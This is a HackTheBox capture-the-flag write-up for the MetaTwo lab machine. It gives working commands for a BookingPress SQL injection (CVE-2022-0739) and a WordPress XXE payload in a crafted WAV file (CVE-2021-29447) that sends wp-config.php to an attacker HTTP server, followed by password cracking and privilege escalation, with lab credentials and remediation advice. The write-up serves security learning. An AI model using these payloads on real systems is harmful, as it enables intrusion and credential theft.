---
layout: post
title: "MetaTwo - HackTheBox WriteUp"
date: 2025-10-26
categories: [CTF, HackTheBox, WriteUp]
tags: [WordPress, SQLi, XXE, FTP, SSH, Passpie, GPG, CVE-2022-0739, CVE-2021-29447, Linux]
difficulty: Easy
platform: HackTheBox
author: Aubin SABY
lang: en
permalink: /en/blog/2022/10/30/metatwo-htb-writeup/
excerpt: "Linux machine focused on Web Security combining unauthenticated SQLi in BookingPress, XXE in WordPress, and privilege escalation via Passpie/GPG."
---

<div class="bg-gradient-to-r from-green-500/10 to-cyan-500/10 p-10 rounded-xl mb-12 border-l-4 border-green-500 shadow-lg">
    <div class="flex flex-col md:flex-row items-start md:items-center justify-between mb-8 gap-6">
        <div class="flex-1">
            <h2 class="text-4xl md:text-5xl font-bold text-green-500 mb-3">
                <i class="fas fa-cube mr-3"></i>MetaTwo
            </h2>
            <p class="text-gray-700 dark:text-gray-300 text-lg md:text-xl">
                WordPress SQLi + XXE + Passpie GPG Privilege Escalation
            </p>
        </div>
        <div class="flex gap-3">
            <span class="px-5 py-2 bg-green-500 text-white rounded-lg text-sm font-semibold shadow-md">
                <i class="fas fa-circle text-xs mr-1"></i>Easy
            </span>
            <span class="px-5 py-2 bg-blue-500 text-white rounded-lg text-sm font-semibold shadow-md">
                <i class="fab fa-linux mr-1"></i>Linux
            </span>
        </div>
    </div>

    <div class="grid grid-cols-2 md:grid-cols-4 gap-6 mt-6">
        <div class="flex items-center gap-3">
            <div class="text-green-500 text-xl">
                <i class="fas fa-calendar"></i>
            </div>
            <div>
                <div class="text-xs uppercase tracking-wide text-gray-600 dark:text-gray-400">Date</div>
                <div class="font-semibold text-gray-800 dark:text-gray-100 text-lg">2025-10-26</div>
            </div>
        </div>

        <div class="flex items-center gap-3">
            <div class="text-blue-500 text-xl">
                <i class="fas fa-network-wired"></i>
            </div>
            <div>
                <div class="text-xs uppercase tracking-wide text-gray-600 dark:text-gray-400">IP</div>
                <div class="font-semibold text-gray-800 dark:text-gray-100 text-lg">10.10.11.186</div>
            </div>
        </div>

        <div class="flex items-center gap-3">
            <div class="text-purple-500 text-xl">
                <i class="fas fa-shield-alt"></i>
            </div>
            <div>
                <div class="text-xs uppercase tracking-wide text-gray-600 dark:text-gray-400">OS</div>
                <div class="font-semibold text-gray-800 dark:text-gray-100 text-lg">Debian 11</div>
            </div>
        </div>

        <div class="flex items-center gap-3">
            <div class="text-amber-500 text-xl">
                <i class="fas fa-star"></i>
            </div>
            <div>
                <div class="text-xs uppercase tracking-wide text-gray-600 dark:text-gray-400">Points</div>
                <div class="font-semibold text-gray-800 dark:text-gray-100 text-lg">20</div>
            </div>
        </div>
    </div>
</div>

## 🎯 Synopsis

**MetaTwo** is an <span class="text-highlight-green">**easy Linux machine**</span> focused on <span class="text-highlight-blue">**Web Security**</span>, combining multiple vulnerabilities related to <span class="text-highlight-red">**WordPress**</span> and its components.

The exploitation starts with an <span class="text-highlight-orange">**unauthenticated SQL injection (CVE-2022-0739)**</span> in the **BookingPress** plugin, allowing retrieval of WordPress user password hashes. After logging into the admin interface, an <span class="text-highlight-purple">**XXE attack (CVE-2021-29447)**</span> via the media library allows extracting the `wp-config.php` file and obtaining <span class="text-highlight-blue">**FTP credentials**</span>. The FTP server reveals a PHP script containing the SSH password for the `jnelson` user. Finally, privilege escalation is achieved via <span class="text-highlight-red">**Passpie**</span>, a password manager using GPG, whose passphrase is cracked to obtain the <span class="text-highlight-green">**root password**</span>.

<div class="grid md:grid-cols-2 gap-6 my-4">
    <div class="bg-white dark:bg-dark-navbar p-6 rounded-xl shadow-lg border-l-4 border-portfolio-violet">
        <h3 class="text-2xl font-bold text-portfolio-violet mb-4">
            <i class="fas fa-brain mr-2"></i>Required Skills
        </h3>
        <ul class="space-y-2 text-gray-700 dark:text-gray-300">
            <li><i class="fas fa-check-circle text-green-500 mr-2"></i>Basic Linux and WordPress knowledge</li>
            <li><i class="fas fa-check-circle text-green-500 mr-2"></i>Familiarity with SQLi and XXE</li>
            <li><i class="fas fa-check-circle text-green-500 mr-2"></i>PHP script analysis</li>
            <li><i class="fas fa-check-circle text-green-500 mr-2"></i>Understanding of GPG and password managers</li>
        </ul>
    </div>
    <div class="bg-white dark:bg-dark-navbar p-6 rounded-xl shadow-lg border-l-4 border-cyan-500">
        <h3 class="text-2xl font-bold text-cyan-500 mb-4">
            <i class="fas fa-rocket mr-2"></i>Acquired Skills
        </h3>
        <ul class="space-y-2 text-gray-700 dark:text-gray-300">
            <li><i class="fas fa-star text-amber-500 mr-2"></i>WordPress plugin exploitation (BookingPress)</li>
            <li><i class="fas fa-star text-amber-500 mr-2"></i>Advanced SQL injection via sqlmap</li>
            <li><i class="fas fa-star text-amber-500 mr-2"></i>XXE attack and file exfiltration</li>
            <li><i class="fas fa-star text-amber-500 mr-2"></i>GPG key decryption with John</li>
        </ul>
    </div>
</div>



## 🔍 Phase 1 — Network Reconnaissance

### Initial Port Scan

We start with a quick scan of all TCP ports to identify exposed services:

```bash
nmap -p- --min-rate=1000 -T4 10.10.11.186
```

### Service Enumeration

Once open ports are identified, we perform an in-depth scan with version detection and NSE scripts:

```bash
ports=$(nmap -p- --min-rate=1000 -T4 10.10.11.186 | grep '^[0-9]' | cut -d'/' -f1 | tr '\n' ',' | sed s/,$//)
nmap -p$ports -sC -sV 10.10.11.186
```

<div class="bg-white dark:bg-dark-navbar p-5 rounded-xl shadow-lg my-4">
    <h4 class="text-xl font-bold mb-4 text-portfolio-violet flex items-center">
        <i class="fas fa-search mr-2"></i>Scan Results
    </h4>
    <div class="space-y-3">
        <div class="flex items-start gap-4 p-4 bg-blue-50 dark:bg-blue-900/20 rounded-lg border-l-4 border-blue-500">
            <div class="text-3xl text-blue-500">
                <i class="fas fa-network-wired"></i>
            </div>
            <div class="flex-1">
                <div class="font-bold text-lg text-blue-600 dark:text-blue-400">Port 21/TCP - FTP</div>
                <div class="text-gray-600 dark:text-gray-400 text-sm mt-1">ProFTPD</div>
                <div class="text-xs text-gray-500 dark:text-gray-500 mt-2">File transfer service</div>
            </div>
        </div>
        <div class="flex items-start gap-4 p-4 bg-blue-50 dark:bg-blue-900/20 rounded-lg border-l-4 border-blue-500">
            <div class="text-3xl text-blue-500">
                <i class="fas fa-network-wired"></i>
            </div>
            <div class="flex-1">
                <div class="font-bold text-lg text-blue-600 dark:text-blue-400">Port 22/TCP - SSH</div>
                <div class="text-gray-600 dark:text-gray-400 text-sm mt-1">OpenSSH 8.4p1 Debian</div>
                <div class="text-xs text-gray-500 dark:text-gray-500 mt-2">Secure remote administration service</div>
            </div>
        </div>
        <div class="flex items-start gap-4 p-4 bg-green-50 dark:bg-green-900/20 rounded-lg border-l-4 border-green-500">
            <div class="text-3xl text-green-500">
                <i class="fas fa-globe"></i>
            </div>
            <div class="flex-1">
                <div class="font-bold text-lg text-green-600 dark:text-green-400">Port 80/TCP - HTTP</div>
                <div class="text-gray-600 dark:text-gray-400 text-sm mt-1">nginx 1.18.0</div>
                <div class="text-xs text-gray-500 dark:text-gray-500 mt-2">Web server hosting the target application</div>
            </div>
        </div>
    </div>
</div>

<div class="bg-cyan-100 dark:bg-cyan-900/20 border-l-4 border-cyan-500 p-4 my-4 rounded-r-lg">
    <p class="text-cyan-800 dark:text-cyan-200">
        <i class="fas fa-lightbulb mr-2 text-cyan-500"></i>
        <strong>Entry point identified:</strong> The web service on port 80 is the most likely initial attack vector.
    </p>
</div>


## 🌐 Phase 2 — Web Analysis (WordPress)

### Domain Configuration

The site redirects to `metapress.htb`. We add it to the `/etc/hosts` file:

```bash
echo "10.10.11.186 metapress.htb" | sudo tee -a /etc/hosts
```

### WordPress Enumeration

Navigating to `http://metapress.htb` reveals a WordPress site with an **Events** section. HTML source code analysis reveals the **BookingPress 1.0.10** plugin.

<div class="bg-white dark:bg-dark-navbar p-6 rounded-xl shadow-lg my-4 border-l-4 border-red-500">
    <div class="flex items-start gap-4 mb-4">
        <div class="text-4xl text-red-500">
            <i class="fas fa-plug"></i>
        </div>
        <div class="flex-1">
            <h4 class="text-xl font-bold text-gray-800 dark:text-gray-200">BookingPress 1.0.10</h4>
            <p class="text-gray-600 dark:text-gray-400">Vulnerable WordPress plugin</p>
        </div>
    </div>
    <p class="text-gray-700 dark:text-gray-300">
        This plugin is vulnerable to an <strong>unauthenticated SQL injection</strong> (CVE-2022-0739), allowing extraction of sensitive data from the WordPress database.
    </p>
</div>



## 💉 Phase 3 — BookingPress Exploitation (CVE-2022-0739)

### Vulnerability Research

A quick search reveals the <span class="text-highlight-orange">**CVE-2022-0739**</span> vulnerability, allowing unauthenticated SQL injection.

<div class="bg-red-50 dark:bg-red-900/20 p-6 rounded-xl border-l-4 border-red-500 my-4">
    <h4 class="text-xl font-bold text-red-600 dark:text-red-400 mb-3 flex items-center">
        <i class="fas fa-bug mr-2"></i>CVE-2022-0739 - SQL Injection
    </h4>
    <div class="space-y-2 text-gray-700 dark:text-gray-300">
        <div class="grid md:grid-cols-2 gap-4">
            <div>
                <span class="font-semibold text-red-600 dark:text-red-400">Affected Plugin:</span> BookingPress < 1.0.11
            </div>
            <div>
                <span class="font-semibold text-red-600 dark:text-red-400">Type:</span> SQL Injection (Unauthenticated)
            </div>
        </div>
        <div>
            <span class="font-semibold text-red-600 dark:text-red-400">CVSS Score:</span> 9.8 (Critical)
        </div>
        <div class="mt-4">
            <span class="font-semibold text-red-600 dark:text-red-400">Description:</span><br>
            The <code>total_service</code> parameter in the <code>bookingpress_front_get_category_services</code> action is not properly sanitized, allowing SQL injection without authentication.
        </div>
    </div>
</div>

### Manual Verification

Retrieved nonce from the Events page source code, then testing the injection:

```bash
curl -i 'http://metapress.htb/wp-admin/admin-ajax.php' \
--data 'action=bookingpress_front_get_category_services&_wpnonce=60646b11e1&category_id=123&total_service=111) UNION ALL SELECT @@version,@@version_comment,@@version_compile_os,1,2,3,4,5,6-- -'
```

<div class="bg-green-100 dark:bg-green-900/20 border-l-4 border-green-500 p-4 my-4 rounded-r-lg">
    <p class="text-green-800 dark:text-green-200">
        <i class="fas fa-check-circle mr-2 text-green-500"></i>
        <strong>Result:</strong> SQL injection confirmed\!
    </p>
</div>

### Exploitation with sqlmap

```bash
sqlmap -u "http://metapress.htb/wp-admin/admin-ajax.php" --method POST \
--data "action=bookingpress_front_get_category_services&_wpnonce=60646b11e1&category_id=123&total_service=111" \
-p total_service --level=5 --risk=3 --dbs
```

**Databases discovered:** `information_schema` and `blog`

### WordPress Users Extraction

```bash
sqlmap -D blog -T wp_users --dump
```

**Retrieved credentials:**

```
admin:$P$BGrGrgf2wToBS79i07Rk9sN4Fzk.TV.
manager:$P$B4aNM28N0E.tMy/JIcnVMZbGcU16Q70
```

### Password Cracking

```bash
john --wordlist=/usr/share/wordlists/rockyou.txt wp_users.hash
```

<div class="bg-green-100 dark:bg-green-900/20 border-l-4 border-green-500 p-4 my-4 rounded-r-lg">
    <p class="text-green-800 dark:text-green-200 font-bold text-lg">
        <i class="fas fa-key mr-2 text-green-500"></i>
        Password found: manager:partylikearockstar
    </p>
</div>

Successful login to `/wp-login` with the `manager` account.


## 🧩 Phase 4 — WordPress Exploitation (XXE, CVE-2021-29447)

### WordPress Version Identification

**Version detected:** WordPress 5.6.2 running PHP 8.0.24

### Vulnerability Research

A quick search reveals the <span class="text-highlight-orange">**CVE-2021-29447**</span> vulnerability, allowing XXE attack via the Media Library.

<div class="bg-red-50 dark:bg-red-900/20 p-6 rounded-xl border-l-4 border-red-500 my-4">
    <h4 class="text-xl font-bold text-red-600 dark:text-red-400 mb-3 flex items-center">
        <i class="fas fa-bug mr-2"></i>CVE-2021-29447 - XXE Injection
    </h4>
    <div class="space-y-2 text-gray-700 dark:text-gray-300">
        <div class="grid md:grid-cols-2 gap-4">
            <div>
                <span class="font-semibold text-red-600 dark:text-red-400">Affected Application:</span> WordPress < 5.6.2
            </div>
            <div>
                <span class="font-semibold text-red-600 dark:text-red-400">Type:</span> XXE Injection (Authenticated)
            </div>
        </div>
        <div>
            <span class="font-semibold text-red-600 dark:text-red-400">CVSS Score:</span> 7.1 (High)
        </div>
        <div class="mt-4">
            <span class="font-semibold text-red-600 dark:text-red-400">Description:</span><br>
            The WAV audio file parsing function in WordPress does not properly validate XML entities. An authenticated attacker can upload a malicious WAV file containing external XML entities to read arbitrary files on the server.
        </div>
    </div>
</div>

### XXE Payload Creation

**evil.dtd file:**

```xml
<\!ENTITY % file SYSTEM "php://filter/read=convert.base64-encode/resource=../wp-config.php">
<\!ENTITY % init "<\!ENTITY &#x25; trick SYSTEM 'http://10.10.14.50:8080/?p=%file;'>">
```

**payload.wav file:**

```bash
echo -en 'RIFF\xb8\x00\x00\x00WAVEiXML\x7b\x00\x00\x00<?xml version="1.0"?><\!DOCTYPE ANY[<\!ENTITY % remote SYSTEM "http://10.10.14.50:8080/evil.dtd">%remote;%init;%trick;]>\x00' > payload.wav
```

### HTTP Server Startup

```bash
python3 -m http.server 8080
```

### Malicious File Upload

1. Login to WordPress with the `manager` account
2. Upload `payload.wav` to the Media Library
3. The server makes an HTTP request containing the base64-encoded file content

**Decoding the result:**

```bash
echo "BASE64_CONTENT" | base64 -d
```

**FTP credentials extracted from wp-config.php:**

```php
define('FTP_USER', 'metapress.htb');
define('FTP_PASS', '9NYS_ii@FyL_p5M2NvJ');
define('FTP_HOST', 'ftp.metapress.htb');
```

<div class="bg-blue-100 dark:bg-blue-900/20 border-l-4 border-blue-500 p-4 my-4 rounded-r-lg">
    <p class="text-blue-800 dark:text-blue-200">
        <i class="fas fa-database mr-2 text-blue-500"></i>
        <strong>FTP credentials obtained\!</strong> FTP server access is possible.
    </p>
</div>



## 📂 Phase 5 — FTP Access and SSH Discovery

### FTP Connection

```bash
ftp 10.10.11.186
# Login: metapress.htb
# Password: 9NYS_ii@FyL_p5M2NvJ
```

### File Enumeration

```bash
ftp> ls -la
ftp> cd mailer
ftp> get send_email.php
```

### send_email.php Analysis

```php
$mail->Username = "jnelson@metapress.htb";
$mail->Password = "Cb4_JmWM8zUZWMu@Ys";
```

<div class="bg-purple-100 dark:bg-purple-900/20 border-l-4 border-purple-500 p-4 my-4 rounded-r-lg">
    <p class="text-purple-800 dark:text-purple-200">
        <i class="fas fa-unlock-alt mr-2 text-purple-500"></i>
        <strong>SSH credentials discovered\!</strong> Attempting connection with jnelson.
    </p>
</div>


## 🔑 Phase 6 — SSH Access and User Flag

### SSH Connection

```bash
ssh jnelson@10.10.11.186
# Password: Cb4_JmWM8zUZWMu@Ys
```

<div class="bg-green-100 dark:bg-green-900/20 border-l-4 border-green-500 p-4 my-4 rounded-r-lg">
    <p class="text-green-800 dark:text-green-200 font-bold text-lg">
        <i class="fas fa-terminal mr-2 text-green-500"></i>
        Successful SSH connection as jnelson\!
    </p>
</div>

### User Flag Retrieval

```bash
cat ~/user.txt
```

<div class="bg-green-100 dark:bg-green-900/20 border-l-4 border-green-500 p-4 my-4 rounded-r-lg">
    <p class="text-green-800 dark:text-green-200">
        <i class="fas fa-flag mr-2 text-green-500"></i>
        <strong>USER FLAG OBTAINED\!</strong> First step completed.
    </p>
</div>


## 🔐 Phase 7 — Local Enumeration (Passpie)

### Passpie Discovery

```bash
ls -la ~
```

**Discovery:** `.passpie` directory present in jnelson's home.

<div class="bg-cyan-100 dark:bg-cyan-900/20 border-l-4 border-cyan-500 p-4 my-4 rounded-r-lg">
    <p class="text-cyan-800 dark:text-cyan-200">
        <i class="fas fa-info-circle mr-2 text-cyan-500"></i>
        <strong>What is Passpie?</strong> A command-line password manager using GPG for encryption.
    </p>
</div>

### Configuration Analysis

```bash
ls -la ~/.passpie
cat ~/.passpie/.keys
```

Presence of private and public GPG keys protected by a passphrase.


## 🔓 Phase 8 — Privilege Escalation via Passpie

### GPG Key Extraction and Cracking

**Transferring keys to local machine:**

```bash
scp jnelson@10.10.11.186:/home/jnelson/.passpie/.keys ./keys
```

**Hash extraction with gpg2john:**

```bash
gpg2john keys > keys.hash
```

**Cracking with John the Ripper:**

```bash
john --wordlist=/usr/share/wordlists/rockyou.txt keys.hash --format=gpg
```

<div class="bg-green-100 dark:bg-green-900/20 border-l-4 border-green-500 p-4 my-4 rounded-r-lg">
    <p class="text-green-800 dark:text-green-200 font-bold text-lg">
        <i class="fas fa-key mr-2 text-green-500"></i>
        Passphrase found: blink182
    </p>
</div>

### Passpie Password Export

```bash
passpie export ~/password.db
# Passphrase: blink182

cat ~/password.db
```

**Result:**

```
credentials:
- comment: ''
  fullname: root@ssh
  login: root
  modified: 2022-06-26 08:58:15.621572
  name: ssh
  password: \!\!python/unicode 'p7qfAZt4_A1xo_0x'
```

### Root Connection

```bash
su root
# Password: p7qfAZt4_A1xo_0x
```

<div class="bg-gray-100 dark:bg-gray-800 p-4 rounded-lg my-4 font-mono text-sm">
    <div class="text-gray-700 dark:text-gray-300">
        uid=0(root) gid=0(root) groups=0(root)
    </div>
</div>

<div class="bg-green-100 dark:bg-green-900/20 border-l-4 border-green-500 p-4 my-4 rounded-r-lg">
    <p class="text-green-800 dark:text-green-200">
        <i class="fas fa-crown mr-2 text-amber-500"></i>
        <strong>ROOT SHELL OBTAINED\!</strong> Maximum privileges achieved.
    </p>
</div>



## 🏁 Phase 9 — Flag Extraction

### Root Flag Retrieval

With root access, we can now retrieve the root flag:

```bash
cat /root/root.txt
```

<div class="bg-gradient-to-r from-amber-500/10 to-yellow-500/10 p-6 rounded-xl border-l-4 border-amber-500 my-4">
    <div class="flex items-center gap-4">
        <div class="text-5xl text-amber-500">
            <i class="fas fa-trophy"></i>
        </div>
        <div class="flex-1">
            <h4 class="text-2xl font-bold text-amber-600 dark:text-amber-400 mb-2">Machine Pwned\!</h4>
            <p class="text-gray-700 dark:text-gray-300">
                <i class="fas fa-flag text-green-500 mr-2"></i><strong>User flag:</strong> /home/jnelson/user.txt<br>
                <i class="fas fa-flag text-red-500 mr-2"></i><strong>Root flag:</strong> /root/root.txt
            </p>
        </div>
    </div>
</div>


## 📋 Phase 10 — Recommendations and Remediation

<div class="grid md:grid-cols-2 gap-6 my-4">
    <div class="bg-white dark:bg-dark-navbar p-5 rounded-xl shadow-lg border-l-4 border-red-500">
        <h4 class="text-xl font-bold text-red-600 dark:text-red-400 mb-4 flex items-start">
            <i class="fas fa-globe mr-2 mt-1"></i><span>Application</span>
        </h4>
        <ul class="space-y-3 text-gray-700 dark:text-gray-300">
            <li class="flex items-start gap-2">
                <i class="fas fa-check text-green-500 mt-1"></i>
                <span>Update WordPress and all plugins to the latest versions</span>
            </li>
            <li class="flex items-start gap-2">
                <i class="fas fa-check text-green-500 mt-1"></i>
                <span>Disable XML/WAV file uploads in the Media Library</span>
            </li>
            <li class="flex items-start gap-2">
                <i class="fas fa-check text-green-500 mt-1"></i>
                <span>Validate and filter all user inputs</span>
            </li>
            <li class="flex items-start gap-2">
                <i class="fas fa-check text-green-500 mt-1"></i>
                <span>Use a WAF to detect injection attempts</span>
            </li>
        </ul>
    </div>
    <div class="bg-white dark:bg-dark-navbar p-5 rounded-xl shadow-lg border-l-4 border-blue-500">
        <h4 class="text-xl font-bold text-blue-600 dark:text-blue-400 mb-4 flex items-start">
            <i class="fas fa-server mr-2 mt-1"></i><span>System</span>
        </h4>
        <ul class="space-y-3 text-gray-700 dark:text-gray-300">
            <li class="flex items-start gap-2">
                <i class="fas fa-check text-green-500 mt-1"></i>
                <span>Never store credentials in accessible files (FTP, Git)</span>
            </li>
            <li class="flex items-start gap-2">
                <i class="fas fa-check text-green-500 mt-1"></i>
                <span>Use strong GPG keys with complex passphrases</span>
            </li>
            <li class="flex items-start gap-2">
                <i class="fas fa-check text-green-500 mt-1"></i>
                <span>Restrict FTP access and regularly audit files</span>
            </li>
            <li class="flex items-start gap-2">
                <i class="fas fa-check text-green-500 mt-1"></i>
                <span>Implement regular password rotation</span>
            </li>
        </ul>
    </div>
</div>

---


## 📝 Command Summary

### 🔍 Phase 1: Network Reconnaissance

```bash
# 1. Full port scan
nmap -p- --min-rate=1000 -T4 10.10.11.186

# 2. Detailed service scan
nmap -p21,22,80 -sC -sV 10.10.11.186

# 3. DNS configuration
echo "10.10.11.186 metapress.htb" | sudo tee -a /etc/hosts
```

### 💉 Phase 2: SQLi Exploitation (CVE-2022-0739)

```bash
# 1. Manual injection test (retrieve nonce from Events page)
curl -i 'http://metapress.htb/wp-admin/admin-ajax.php' \
--data 'action=bookingpress_front_get_category_services&_wpnonce=60646b11e1&category_id=123&total_service=111) UNION ALL SELECT @@version,@@version_comment,@@version_compile_os,1,2,3,4,5,6-- -'

# 2. Automated extraction with sqlmap
sqlmap -u "http://metapress.htb/wp-admin/admin-ajax.php" --method POST \
--data "action=bookingpress_front_get_category_services&_wpnonce=60646b11e1&category_id=123&total_service=111" \
-p total_service --level=5 --risk=3 --dbs

# 3. WordPress users dump
sqlmap -D blog -T wp_users --dump

# 4. Password cracking
john --wordlist=/usr/share/wordlists/rockyou.txt wp_users.hash
# → Result: manager:partylikearockstar
```

### 🧩 Phase 3: XXE Exploitation (CVE-2021-29447)

```bash
# 1. Create evil.dtd file
echo '<!ENTITY % file SYSTEM "php://filter/read=convert.base64-encode/resource=../wp-config.php">
<!ENTITY % init "<!ENTITY &#x25; trick SYSTEM '"'"'http://10.10.14.50:8080/?p=%file;'"'"'>">' > evil.dtd

# 2. Create malicious WAV payload
echo -en 'RIFF\xb8\x00\x00\x00WAVEiXML\x7b\x00\x00\x00<?xml version="1.0"?><!DOCTYPE ANY[<!ENTITY % remote SYSTEM "http://10.10.14.50:8080/evil.dtd">%remote;%init;%trick;]>\x00' > payload.wav

# 3. Start HTTP server
python3 -m http.server 8080

# 4. Upload payload.wav to WordPress Media Library
# → Login with manager:partylikearockstar
# → Upload via Media > Add New

# 5. Decode base64 result
echo "BASE64_CONTENT" | base64 -d
# → Result: metapress.htb / 9NYS_ii@FyL_p5M2NvJ
```

### 📂 Phase 4: FTP Access and SSH Pivoting

```bash
# 1. FTP connection
ftp 10.10.11.186
# Login: metapress.htb
# Password: 9NYS_ii@FyL_p5M2NvJ

# 2. Enumeration and download
ls -la
cd mailer
get send_email.php
exit

# 3. File analysis
cat send_email.php
# → Result: jnelson / Cb4_JmWM8zUZWMu@Ys

# 4. SSH connection
ssh jnelson@10.10.11.186
# Password: Cb4_JmWM8zUZWMu@Ys

# 5. User flag retrieval
cat ~/user.txt
```

### 🔓 Phase 5: Privilege Escalation via Passpie

```bash
# 1. Local enumeration
ls -la ~
# → Discovery of .passpie/

# 2. GPG keys transfer
scp jnelson@10.10.11.186:/home/jnelson/.passpie/.keys ./keys

# 3. GPG hash extraction
gpg2john keys > keys.hash

# 4. Passphrase cracking
john --wordlist=/usr/share/wordlists/rockyou.txt keys.hash --format=gpg
# → Result: blink182
```

### 👑 Phase 6: Root Access (on target machine)

```bash
# 1. Passpie passwords export
passpie export ~/password.db
# Passphrase: blink182

# 2. Read exported file
cat ~/password.db
# → root password: p7qfAZt4_A1xo_0x

# 3. Root connection
su root
# Password: p7qfAZt4_A1xo_0x

# 4. Root flag retrieval
cat /root/root.txt
```

---

## 🔗 Attack Chain Summary

<div class="bg-white dark:bg-dark-navbar px-6 py-5 rounded-xl shadow-lg my-8">
    <h3 class="text-2xl font-bold text-portfolio-violet mb-4 flex items-center">
        <i class="fas fa-sitemap mr-3"></i>Summarized Attack Chain
    </h3>
    <div class="space-y-4">
        <div class="flex items-start gap-4 p-4 bg-blue-50 dark:bg-blue-900/20 rounded-lg border-l-4 border-blue-500">
            <div class="text-3xl font-bold text-blue-500 mt-1">1</div>
            <div class="flex-1">
                <div class="font-bold text-blue-600 dark:text-blue-400">Reconnaissance and enumeration</div>
                <div class="text-sm text-gray-600 dark:text-gray-400">Nmap → WordPress → BookingPress 1.0.10</div>
            </div>
        </div>
        <div class="flex items-start gap-4 p-4 bg-green-50 dark:bg-green-900/20 rounded-lg border-l-4 border-green-500">
            <div class="text-3xl font-bold text-green-500 mt-1">2</div>
            <div class="flex-1">
                <div class="font-bold text-green-600 dark:text-green-400">SQLi and XXE exploitation</div>
                <div class="text-sm text-gray-600 dark:text-gray-400">CVE-2022-0739 → WordPress creds → CVE-2021-29447 → FTP creds</div>
            </div>
        </div>
        <div class="flex items-start gap-4 p-4 bg-purple-50 dark:bg-purple-900/20 rounded-lg border-l-4 border-purple-500">
            <div class="text-3xl font-bold text-purple-500 mt-1">3</div>
            <div class="flex-1">
                <div class="font-bold text-purple-600 dark:text-purple-400">FTP to SSH pivot</div>
                <div class="text-sm text-gray-600 dark:text-gray-400">FTP access → send_email.php → SSH jnelson</div>
            </div>
        </div>
        <div class="flex items-start gap-4 p-4 bg-red-50 dark:bg-red-900/20 rounded-lg border-l-4 border-red-500">
            <div class="text-3xl font-bold text-red-500 mt-1">4</div>
            <div class="flex-1">
                <div class="font-bold text-red-600 dark:text-red-400">Privilege escalation</div>
                <div class="text-sm text-gray-600 dark:text-gray-400">Passpie → GPG cracking → Root password → Root shell</div>
            </div>
        </div>
    </div>
</div>

---


## 🏷️ Tags & References

<div class="flex flex-wrap gap-2 my-4" style="line-height: 1.5;">
    <span style="display: inline-block; padding: 0.25rem 0.5rem; background-color: rgba(59, 130, 246, 0.1); color: #3b82f6; border-radius: 0.25rem; font-size: 0.75rem; font-weight: 600;">WordPress</span>
    <span style="display: inline-block; padding: 0.25rem 0.5rem; background-color: rgba(239, 68, 68, 0.1); color: #ef4444; border-radius: 0.25rem; font-size: 0.75rem; font-weight: 600;">SQLi</span>
    <span style="display: inline-block; padding: 0.25rem 0.5rem; background-color: rgba(249, 115, 22, 0.1); color: #f97316; border-radius: 0.25rem; font-size: 0.75rem; font-weight: 600;">XXE</span>
    <span style="display: inline-block; padding: 0.25rem 0.5rem; background-color: rgba(168, 85, 247, 0.1); color: #a855f7; border-radius: 0.25rem; font-size: 0.75rem; font-weight: 600;">FTP</span>
    <span style="display: inline-block; padding: 0.25rem 0.5rem; background-color: rgba(34, 197, 94, 0.1); color: #22c55e; border-radius: 0.25rem; font-size: 0.75rem; font-weight: 600;">SSH</span>
    <span style="display: inline-block; padding: 0.25rem 0.5rem; background-color: rgba(99, 102, 241, 0.1); color: #6366f1; border-radius: 0.25rem; font-size: 0.75rem; font-weight: 600;">Passpie</span>
    <span style="display: inline-block; padding: 0.25rem 0.5rem; background-color: rgba(236, 72, 153, 0.1); color: #ec4899; border-radius: 0.25rem; font-size: 0.75rem; font-weight: 600;">GPG</span>
    <span style="display: inline-block; padding: 0.25rem 0.5rem; background-color: rgba(14, 165, 233, 0.1); color: #0ea5e9; border-radius: 0.25rem; font-size: 0.75rem; font-weight: 600;">CVE-2022-0739</span>
    <span style="display: inline-block; padding: 0.25rem 0.5rem; background-color: rgba(245, 158, 11, 0.1); color: #f59e0b; border-radius: 0.25rem; font-size: 0.75rem; font-weight: 600;">CVE-2021-29447</span>
    <span style="display: inline-block; padding: 0.25rem 0.5rem; background-color: rgba(107, 114, 128, 0.1); color: #6b7280; border-radius: 0.25rem; font-size: 0.75rem; font-weight: 600;">Linux</span>
    <span style="display: inline-block; padding: 0.25rem 0.5rem; background-color: rgba(6, 182, 212, 0.1); color: #06b6d4; border-radius: 0.25rem; font-size: 0.75rem; font-weight: 600;">HackTheBox</span>
</div>

<div class="bg-white dark:bg-dark-navbar p-6 rounded-xl shadow-lg my-4">
    <h4 class="text-lg font-bold mb-4 text-portfolio-violet flex items-center">
        <i class="fas fa-link mr-2"></i>Useful References
    </h4>
    <ul class="space-y-2 text-gray-700 dark:text-gray-300">
        <li>
            <a href="https://wpscan.com/vulnerability/388cd42d-b61a-42a4-8604-99b812db2357" target="_blank" class="text-blue-600 dark:text-blue-400 hover:underline flex items-center gap-2">
                <i class="fas fa-external-link-alt text-xs"></i>
                CVE-2022-0739 - BookingPress SQLi
            </a>
        </li>
        <li>
            <a href="https://blog.wpsec.com/wordpress-xxe-in-media-library-cve-2021-29447/" target="_blank" class="text-blue-600 dark:text-blue-400 hover:underline flex items-center gap-2">
                <i class="fas fa-external-link-alt text-xs"></i>
                CVE-2021-29447 - WordPress XXE
            </a>
        </li>
        <li>
            <a href="https://passpie.readthedocs.io/" target="_blank" class="text-blue-600 dark:text-blue-400 hover:underline flex items-center gap-2">
                <i class="fas fa-external-link-alt text-xs"></i>
                Passpie Documentation
            </a>
        </li>
    </ul>
</div>

---

<div class="text-center my-12">
    <a href="{{ site.baseurl }}/en/blog/" class="inline-block bg-gradient-to-r from-portfolio-violet to-cyan-500 hover:from-portfolio-violet-light hover:to-cyan-600 text-white font-bold py-4 px-10 rounded-lg shadow-lg transition duration-300 transform hover:scale-105">
        <i class="fas fa-arrow-left mr-2"></i>Back to blog
    </a>
</div>
